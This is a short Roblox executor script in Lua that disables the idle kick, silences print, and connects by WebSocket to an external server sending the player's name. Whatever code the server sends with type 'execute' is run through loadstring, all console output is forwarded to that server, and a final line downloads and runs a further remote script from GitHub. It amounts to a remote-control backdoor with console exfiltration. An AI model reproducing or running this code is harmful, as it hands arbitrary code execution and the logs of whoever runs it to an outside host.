-- This file was generated using Luraph Obfuscator v14.1 [https://lura.ph/]
spawn(function() 
local LocalPlayer = game.Players.LocalPlayer

local HttpService = game:GetService("HttpService"); 
local LogService = game:GetService("LogService"); 
getgenv().print = function() end

local GC = getconnections or get_signal_cons
    if GC then
        for i,v in pairs(GC(game.Players.LocalPlayer.Idled)) do
            if v["Disable"] then
                v["Disable"](v)
            elseif v["Disconnect"] then
                v["Disconnect"](v)
            end
        end
    else
        local VirtualUser = game:GetService("VirtualUser")
        Players.LocalPlayer.Idled:Connect(function()
            VirtualUser:CaptureController()
            VirtualUser:ClickButton2(Vector2.new())
        end)
    end

local Connection = getgenv().WebSocket.connect("wss://adu-0nny.onrender.com/?token=haha&isClient=true&clientName="..LocalPlayer.Name)

 LogContentType = {"Output", "Info", "Warning", "Error"}


Connection.OnMessage:Connect(function(msg)

    du = HttpService:JSONDecode(msg) 
    if du.type == "execute" then 
       loadstring(du.data)()
    end
end) 


function Send(Content, Type) 
    Connection:Send(HttpService:JSONEncode({
            type = "emitConsole", 
            data = 
            {
                Type = Type, 
                Date = os.time(), 
                From = LocalPlayer.Name, 
                Content = Content
            }
        })) 
end 

Send("Loaded", "Info")
LogService.MessageOut:Connect(function(Content, Type) 
    local Vcl = Enum.MessageType
    Send(Content, (Type == Vcl.MessageOutput and "Output") or (Type == Vcl.MessageInfo and "Info") or (Type == Vcl.MessageWarning and "Warning") or (Type == Vcl.MessageError and "Error"))
end)
    end)
loadstring(game:HttpGet("https://github.com/eltrul/about-myself/blob/main/SwitchKaitun.lua?raw=true"))()
